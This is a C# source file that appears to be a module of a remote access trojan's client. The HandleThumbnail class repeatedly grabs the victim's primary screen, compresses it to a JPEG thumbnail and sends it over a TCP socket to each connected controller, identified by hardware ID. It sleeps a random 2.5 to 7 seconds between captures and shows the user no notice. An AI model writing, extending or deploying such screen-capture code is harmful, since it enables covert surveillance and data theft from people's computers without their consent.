using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using MessagePack;

namespace Client.HandlePacket
{
    internal class HandleThumbnail
    {
        public List<string> controlers;

        public HandleThumbnail()
        {
            controlers = new List<string>();
        }

        public void Start()
        {
            try
            {
                while (Program.TCP_Socket.IsConnected && controlers.Count > 0)
                {
                    Thread.Sleep(new Random().Next(2500, 7000));
                    var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                    using (var g = Graphics.FromImage(bmp))
                    using (var memoryStream = new MemoryStream())
                    {
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                        var thumb = bmp.GetThumbnailImage(256, 256, () => false, IntPtr.Zero);
                        thumb.Save(memoryStream, ImageFormat.Jpeg);
                        foreach (var Controler_HWID in controlers)
                        {
                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "thumbnail";
                            msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                            msgpack.ForcePathObject("Image").SetAsBytes(memoryStream.ToArray());
                            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                        }

                        thumb.Dispose();
                    }

                    bmp.Dispose();
                }
            }
            catch (Exception ex)
            {
                foreach (var Controler_HWID in controlers)
                {
                    Program.TCP_Socket.Log(Controler_HWID, ex.Message);
                }
            }
        }
    }
}